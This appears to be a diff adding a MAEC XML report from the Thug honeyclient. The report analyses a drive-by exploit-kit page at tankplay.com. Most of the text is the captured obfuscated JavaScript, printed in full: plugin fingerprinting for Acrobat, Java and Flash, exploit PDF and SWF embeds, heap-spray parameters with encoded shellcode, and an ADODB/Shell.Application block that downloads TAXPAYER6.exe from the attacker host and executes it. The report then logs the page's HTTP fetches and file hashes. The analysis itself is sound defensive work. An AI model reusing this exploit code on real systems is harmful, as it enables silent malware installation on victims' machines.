@@ -1,0 +1,216 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-23 22:08:19.467103" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://1212122sss222.tankplay.com/news/guarantee-detain.html" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:28">
+                                <Discovery_Method tool_id="maec:thug:tol:27" method="Dynamic Analysis"/>
+                                <Code_Segment>
+
+                    Hostile=false;
+                    thigh=0;
+                    if(navigator.plugins &amp;&amp; navigator.plugins.length){
+                        for(var Ill=0; Ill&lt;navigator.plugins.length;Ill++){if(navigator.plugins[Ill].description.indexOf('Adobe Acrobat')!=-1){thigh=parseFloat(navigator.plugins[Ill].description.split('Version ')[1]);Hostile=true;break}if(navigator.plugins[Ill].description.indexOf('Adobe PDF')!=-1){Hostile=true;break}}
+                    }else if (window.ActiveXObject) {var control = null;try {control = new ActiveXObject('AcroPDF.PDF');} catch (e) {}if (!control) {try {control = new ActiveXObject('PDF.PdfCtrl');} catch (e) {}}if (control) {isInstalled = true;version = control.GetVersions().split(',');version = version[0].split('=');version = parseFloat(version[1]);thigh=version;Hostile=true;}}
+                    thigh=parseInt(thigh);
+                </Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:30">
+                                <Discovery_Method tool_id="maec:thug:tol:29" method="Dynamic Analysis"/>
+                                <Code_Segment>
+                    computing =true;if(computing&gt;642) {var worthwhile='Developing Hand';var tough_='7025'; document.body.appendChild(document.createElement("p",'8974')); } else if(computing &gt;329){var colonelfilm_ ="5480"; var concept_entrance='FRAUD SPEED CAR'; } function Kingdom(Strain){document.body.appendChild(document.createElement("p","ALLIED BOMBER TRAIT SEIZE SPECULATOR")); var boast_ ="distinctly";} slow=true; if( slow==444) {document.body.appendChild(document.createElement("p",'counsel'));document.body.appendChild(document.createElement("p",'quote chamber merely'));}soak_chamber =true; if ( soak_chamber &lt;=979) {document.body.appendChild(document.createElement("p","STEEP MOON PILLOW NAIL EXPAND")); document.body.appendChild(document.createElement("p","4380"));var herinterlock ='1975';}
+                </Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:32">
+                                <Discovery_Method tool_id="maec:thug:tol:31" method="Dynamic Analysis"/>
+                                <Code_Segment>
+expression_immediate= 984;if ( expression_immediate&gt; 633){document.body.appendChild(document.createElement("p",'7452')); var airport_vast_='Marvellous Ignore Previous Mattress Enjoy Humour Collect';document.body.appendChild(document.createElement("p",'COMPATIBLE COMPARE ENORMOUSLY BOUNCE')); }var VIOLATION=[0,0,0,0];try{var LESSEN=function(){var ECONOMICS={Perform:null,wedge:null,Poster:'application/npruntime-scriptable-plugin;DeploymentToolkit',Imitate:'application/java-deployment-toolkit',learning:null,Bind:null,DISTURB:function(){var Single=new Array();if(this.digit()){var REBELLION=this.may();var calmly=REBELLION.jvms;for(var i=0;i&lt;calmly.getLength();i++){Single[i]=calmly.get(i).version}}else{var br = this.g6();if(br=='MSIE'){if(this.ax('1.7.0')){Single[0]='1.7.0'}else if(this.ax('1.6.0')){Single[0]='1.6.0'}else if(this.ax('1.5.0')){Single[0]='1.5.0'}else if(this.ax('1.4.2')){Single[0]='1.4.2'}else if(this.tm()){Single[0]='1.1'}}else if(br=='Netscape Family'){this.gj();if(this.Perform!=null){Single[0]=this.Perform}else if(this.tt('1.7')){Single[0]='1.7.0'}else if(this.tt('1.6')){Single[0]='1.6.0'}else if(this.tt('1.5')){Single[0]='1.5.0'}else if(this.tt('1.4.2')){Single[0]='1.4.2'}}}return Single},ax:function(h){var on='JavaWebStart.isInstalled.'+h+'.0';if(typeof ActiveXObject=='undefined'||!ActiveXObject)return false;try{return (new ActiveXObject(on)!=null)}catch(exception){return false}},tm:function(){var clsid='{08B0E5C0-4FCB-11CF-AAA5-00401C608500}';if (typeof oClientCaps!='undefined'){var v=oClientCaps.getComponentVersion(clsid,"ComponentID");if((v=='')||(v=='5,0,5000,0')){return false}else{return true}}else{return false}},tt:function(ga){if(!navigator.mimeTypes)return false;for(var i=0;i&lt;navigator.mimeTypes.length;++i){s=navigator.mimeTypes[i].type;var m=s.match(/^application\/x-java-applet;version=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);if(m!=null)if(this.cv(m[1],ga))return true}return false},cv:function(ib,rq){var a=ib.split('.');var b=rq.split('.');for(var i=0;i&lt;a.length;++i)a[i]=Number(a[i]);for(var i=0;i&lt;b.length;++i)b[i]=Number(b[i]);if(a.length==2)a[2]=0;if(a[0]&gt;b[0])return true;if(a[0]&lt;b[0])return false;if(a[1]&gt;b[1])return true;if(a[1]&lt;b[1])return false;if(a[2]&gt;b[2])return true;if(a[2]&lt;b[2])return false;return true},gj:function(){for(var i=0;i&lt;navigator.mimeTypes.length;++i){var s=navigator.mimeTypes[i].type;var m=s.match(/^application\/x-java-applet;jpi-version=(.*)$/);if(m!=null){this.Perform=m[1];if('Opera'!=this.Bind)break}}},digit:function(){var pk=this.may();if(pk&amp;&amp;pk.jvms){return true}else{return false}},ap:function(){this.g6();return ('Safari'!=this.Bind&amp;&amp;'Opera'!=this.Bind)},may:function(){this.rf();var r = null;if (this.ap())r = document.getElementById('deployJavaPlugin');return r},g6:function(){if (this.learning == null){var br=navigator.userAgent.toLowerCase();if((br.indexOf('msie')!=-1)&amp;&amp;(br.indexOf('opera')==-1)){this.learning='MSIE';this.Bind='MSIE'}else if(br.indexOf('iphone')!=-1){this.learning='Netscape Family';this.Bind='iPhone'}else if((br.indexOf('firefox')!=-1)&amp;&amp;(br.indexOf('opera')==-1)){this.learning='Netscape Family';this.Bind='Firefox'}else if(br.indexOf('chrome')!=-1){this.learning='Netscape Family';this.Bind='Chrome'}else if(br.indexOf('safari')!=-1){this.learning='Netscape Family';this.Bind='Safari'}else if((br.indexOf('mozilla')!=-1)&amp;&amp;(br.indexOf('opera')==-1)){this.learning='Netscape Family';this.Bind='Other'}else if(br.indexOf('opera')!=-1){this.learning='Netscape Family';this.Bind='Opera'}else{this.learning='?';this.Bind='unknown'}}return this.learning},wt:function(){var br=this.g6();if(br=='MSIE'){document.write('&lt;'+'object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" '+'id="deployJavaPlugin" width="0" height="0"&gt;'+'&lt;'+'/'+'object'+'&gt;')}else if(br=='Netscape Family'&amp;&amp;this.ap()){this.we()}},rf:function(){navigator.plugins.refresh(false);var br=this.g6();if(br=='Netscape Family'&amp;&amp;this.ap()){var pj=document.getElementById('deployJavaPlugin');if(pj==null)this.we()}},we: function(){var wn=false;if(navigator.mimeTypes!=null){for(var i=0;i&lt;navigator.mimeTypes.length;i++){if(navigator.mimeTypes[i].type==this.Imitate)if(navigator.mimeTypes[i].enabledPlugin){document.write('&lt;'+'embed id="deployJavaPlugin" type="'+this.Imitate+'" hidden="true" /&gt;');wn=true}}if(!wn)for(var i=0;i&lt;navigator.mimeTypes.length;i++)if(navigator.mimeTypes[i].type==this.Poster)if(navigator.mimeTypes[i].enabledPlugin)document.write('&lt;'+'embed id="deployJavaPlugin" type="'+this.Poster+'" hidden="true" /&gt;')}}};ECONOMICS.wt();if(ECONOMICS.wedge==null){var l2=null;if(l2==null)try{l2=navigator.userLanguage}catch(err){}if(l2==null)try{l2=navigator.systemLanguage}catch(err){}if(l2==null)try{l2=navigator.language}catch(err){}if(l2!=null){l2.replace("-","_");ECONOMICS.wedge=l2}}return ECONOMICS}();var VIOLATION=LESSEN.DISTURB().toString().replace("_",".").split(".");for(var i=0;i&lt;VIOLATION.length;i++)VIOLATION[i]=parseInt(VIOLATION[i]);if(i&lt;2){VIOLATION=[0,0,0,0]}}catch(e){}
+
+                    if ((VIOLATION[1]&lt;6&amp;&amp;VIOLATION[0]&gt;0)||(VIOLATION[1]==6&amp;&amp;VIOLATION[3]&lt;33)||(VIOLATION[1]==7&amp;&amp;VIOLATION[3]&lt;9)){
+                        beach= null;if( beach &gt;= 982) {document.body.appendChild(document.createElement("p","MINUS BYE LEAK HALFWAY BEING FURNITURE"));document.body.appendChild(document.createElement("p",'PULSE STRUCTURE BATTLE FUNCTIONAL GIANT'));} else if( beach &lt;244){var advisorydam="SINGULAR GRADUATE CLING UPTODATE CRICKET"; }
+                            setTimeout('Fate();', 6740);
+
+                    } else {
+
+                        Fate();
+
+                    }
+                    function worldsister(emperor, wonder){document.body.appendChild(document.createElement("p","3572"));var gown_uncertain_='9079'; document.body.appendChild(document.createElement("p","calf"));}
+                    function Fate(){
+                        though =true;if (though== 320) {var attendance_ ="Wedding Coast Utterly Workplace Expected Saucer"; }
+                        if (Hostile||(thigh&gt;0&amp;&amp;thigh&lt;10)){
+
+                            var HONEST=document.createElement('div');
+                            function coffinslim(ALBEIT, EMPLOYER, BEGIN){document.body.appendChild(document.createElement("p","GLOBAL IMPROVED"));var observe_prince ='';document.body.appendChild(document.createElement("p",'stand frequent interlock trial digit resign'));}
+                                        HONEST.innerHTML = '&lt;object data="/'+(((thigh&gt;0)&amp;&amp;(thigh&lt;8))?('news/Gradual-Conflict2.pdf'):('news/LIMB-PEOPLE1.PDF'))+'" type="application/pdf" width="100" height="200"&gt;&lt;embed src="/'+(((thigh&gt;0)&amp;&amp;(thigh&lt;8))?('news/Gradual-Conflict2.pdf'):('news/LIMB-PEOPLE1.PDF'))+'" type="application/pdf" width="300" height="300" /&gt;&lt;/object&gt;';
+                                    retreat=999;if( retreat&lt;507) {var lens ='5404';} else if( retreat&gt;663){document.body.appendChild(document.createElement("p","ABLE CUBE"));var hugsurprising_ ="8333";}
+                            document.body.appendChild(HONEST);
+                            setTimeout('Over();', 5098);
+
+                        }
+                    }
+
+                    function getCN(){return "/news/marathon_corn1.swf"}
+                    function getBlockSize(){return 1024}
+                    function getAllocSize(){return 1024*1024}
+                    function getAllocCount(){return 300}
+                    function getFillBytes(){var a='%'+'u'+'0c0c';return a+a}
+                    function vfsq(){var a="8200ad482ad405a1160ad6a7a9617a0787ac796ab570ad4f5a7064a7454a60b4a9415a8544a6434ac594aa160ad481a01b1a8191ae1e4ac4f1ad181a7070a8521ac5c5a8504a2370a15e1aeee6a3733a2e2aa59b1a7492a621aa6d2aa4c0ba6662a7d6aa6d7da0c4bae702a6d7da8224ace24a82d5a8a71a2df6a82d5a8a71ab3f6aa23ca423cababeae7c2ab77da3c42a82baac224a7de7a82b7ae324a8ed5ac3daa7de7a2482ab7f7a2482a2482a9697a53c2a0ac6ac281a2a9ea8217a5312aeec6a4444a60c4a53d2afec6aa4c5af585a5382afec6a1e97a0cb1a423aa7de7a8282a0d82ab704ab580a8050ac002afec6ab1a1ae5a5ac0c2afec6af4b5aa5d4ac2c0a42fea47c0a825aa9282a4cc2aa59aaa23ca7d3ca7d7da0c94a3a0cace02ae3baac77da4454ad5a5a8204a6482a0474a7dbcabed2a83baa3a67a3a4ca87d7a8e13a87baa8282a7d82a8604a8724a8207a8282a0c82aac1da7d7da0b7da170ca24d2a3afda0402abd3aaeb3cac5b2a42b1a8a55a0480a583aa3cb7a17bea3867ab2deac23aa5f3aa0fb2a423aac7c0a4c7da5ae6a4236ae43aab25fa67c0a673aad5eca3173a3c9da2f86a52b2a9e3eac502a01ada6983a3f72adeb1a58b2a964da1e16addb1a80b2a3ae5adde7a05b2ac5d1a413aa3ad5a97e7a3c46a971caccd5ac0daafac1ad53da11e2abee6a8681a093aa7d7dad383a9a6cab140ab2c5a6741ae43aab13fae502ae73aa8543a423aa3a86a8681ac43aab18ea1c77ad5c1adaccaffffabeffa508eaafbea042ea0382aef08a9e94a6618a139ca0185acfbea4ecfa6638a1414a1414a".split("").reverse().join("");return a["replace"](/a/g,"%"+"u")};
+                    getShellCode=vfsq;
+                    function diagnosis(){try {try {var axo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.6');try { axo.AllowScriptAccess = 'always'; }catch(e) { return '6,0,0'; }} catch(e) {}return new ActiveXObject('ShockwaveFlash.ShockwaveFlash').GetVariable('$version').replace(/\D+/g, ',').match(/^,?(.+),?$/)[1];} catch(e) {try {if(navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin){return (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]).description.replace(/\D+/g, ",").match(/^,?(.+),?$/)[1];}} catch(e) {}}return '0,0,0';}
+                    function Over(){
+                        var CHICKEN=diagnosis().split(',');
+                        if (((CHICKEN[0]==10&amp;&amp;CHICKEN[1]==0&amp;&amp;CHICKEN[2]&gt;40)||(document&amp;&amp;(CHICKEN[0]==10&amp;&amp;CHICKEN[1]&gt;0)&amp;&amp;(CHICKEN[0]==10&amp;&amp;CHICKEN[1]&lt;2)))||window.document&amp;&amp;((CHICKEN[0]==10&amp;&amp;CHICKEN[1]==2&amp;&amp;CHICKEN[2]&lt;159)||(CHICKEN[0]==10&amp;&amp;CHICKEN[1]&lt;2))){
+                            var oSpan=document.createElement("div");
+                            window["doc"+"ument"]["bo"+"dy"].appendChild(oSpan);
+                            oSpan.innerHTML="&lt;object classid='clsid:d27cdb6e-ae6d-11cf-96b8-444553540000' width=10 height=10 id='swf_id'&gt;&lt;param name='movie' value='/news/PAINTER.SUPPOSE2.SWF' /&gt;&lt;param name='allowScriptAccess' value='always' /&gt;&lt;param name='Play' value='0' /&gt;&lt;embed src='/news/PAINTER.SUPPOSE2.SWF' id='swf_id' name='swf_id' allowScriptAccess='always' type='application/x-shockwave-flash' width='10' height='10'&gt;&lt;/embed&gt;&lt;/object&gt;";
+                        }
+                            if((CHICKEN[0]==10&amp;&amp;CHICKEN[1]==3&amp;&amp;CHICKEN[2]&lt;181)||(CHICKEN[0]==10&amp;&amp;CHICKEN[1]==3&amp;&amp;CHICKEN[2]==181&amp;&amp;CHICKEN[3]&lt;=23)){
+                            var oSpan=document.createElement("div");
+                            window["doc"+"ument"]["bo"+"dy"].appendChild(oSpan);
+                            var avmurl = "02e67fbb17743a4a767aaa6913f182f245b4a822e32211db561495c792e45dbef4b8aad52ef5d72a79b40c9ebe6556ddd833c30b01821809eb50f289146a27a9b6d584d6db6c1c";
+                            oSpan.innerHTML="&lt;object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' id='asd' width='600' height='400' codebase='http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab'&gt;&lt;param name='movie' value='/news/AGGRESSIVE3.SWF?info="+avmurl+"' /&gt;&lt;embed src='/news/PAINTER.SUPPOSE2.SWF?info="+avmurl+"' name='asd' align='middle' allowNetworking='all' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer'&gt;&lt;/embed&gt;&lt;/object&gt;";
+                        }
+                        }
+
+
+
+
+                    try{document.body++;}catch(dsgsdg){
+                    var ra4=".//..//2adb.exe",ra3=document.createElement("object");
+                    cr="CreateObject";
+                    ra3.setAttribute("id",ra3);
+                    ra3.setAttribute("classid","clsid:"+"BD96C556-65A3-"+"11D0-983A-00C04FC29E36");
+                    try{
+                        var ra0=ra3[cr]("adodb.stream",""),ra1=ra3.CreateObject("Shell.Application",""),ra2=ra3.CreateObject("msxml2.XMLHTTP","");
+                        try{
+                            ra2.open("GET","http://1212122sss222.tankplay.com/news/TAXPAYER6.exe",false);
+                            ra2.send();
+                            ra0.type=1;
+                            ra0.open();
+                            ra0.Write(ra2.responseBody);
+                            ra0.SaveToFile(ra4,2);
+                            ra0.Close();
+                        }catch(e){}
+                        try{
+                            se="shell";
+                            try{document.body++;se+="asdasd";}catch(gdhsd){se+="exe";}
+                            ra1[se+"cute"](ra4);
+                        }catch(e){}
+                    }catch(e){}
+                    }
+
+                    document.write("&lt;b style='color:red;font-size:50px'&gt;" + VIOLATION + "&lt;/b&gt;");
+                </Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://1212122sss222.tankplay.com/news/guarantee-detain.html</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.15</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/guarantee-detain.html (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:6">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/guarantee-detain.html (Content-type: text/html, MD5: e521271ba8d2b7898d483bba6ede9276)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:7" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:8">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/TAXPAYER.JAR (Status: 200, Referrer: http://1212122sss222.tankplay.com/news/guarantee-detain.html)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:9" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:10">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/TAXPAYER.JAR (Content-type: application/java-archive, MD5: 2a1fb03d0e0027b57eed91c42706cce2)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:11" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:13">
+            <Description>
+                <Text>[HTTP] URL: http://java.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab#Version=6,0,0,0 (Status: 404, Referrer: http://1212122sss222.tankplay.com/news/guarantee-detain.html)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:14" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:15">
+            <Description>
+                <Text>[HTTP Redirection (Status: 301)] Content-Location: http://java.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab#Version=6,0,0,0 --&gt; Location: http://javadl-esd.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:16" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:17">
+            <Description>
+                <Text>[File Not Found] URL: http://java.sun.com/update/1.6.0/jinstall-6u60-windows-i586.cab#Version=6,0,0,0</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:18" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:19">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/favicon.ico (Status: 200, Referrer: http://1212122sss222.tankplay.com/news/guarantee-detain.html)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:20" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:21">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/favicon.ico (Content-type: text/html, MD5: 1e9913e49a84fca71897e961c94cb716)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:22" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:23">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/Concerned.More.eot (Status: 200, Referrer: http://1212122sss222.tankplay.com/news/guarantee-detain.html)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:24" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:25">
+            <Description>
+                <Text>[HTTP] URL: http://1212122sss222.tankplay.com/news/Concerned.More.eot (Content-type: text/html, MD5: ca25e6ab156d310f9961eb13111e7de8)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:26" method="Dynamic Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools>
+        <Object_Pool>
+            <Object id="maec:thug:obj:12">
+                <File_System_Object_Attributes>
+                    <Hashes>
+                        <Hash type="sha1">
+                            <Hash_Value>c76d7f31f2f84f762a19d2c70b2b6ad95fbde480</Hash_Value>
+                        </Hash>
+                        <Hash type="md5">
+                            <Hash_Value>2a1fb03d0e0027b57eed91c42706cce2</Hash_Value>
+                        </Hash>
+                    </Hashes>
+                    <File_Type type="JAR"/>
+                </File_System_Object_Attributes>
+            </Object>
+        </Object_Pool>
+    </Pools>
+</MAEC_Bundle>
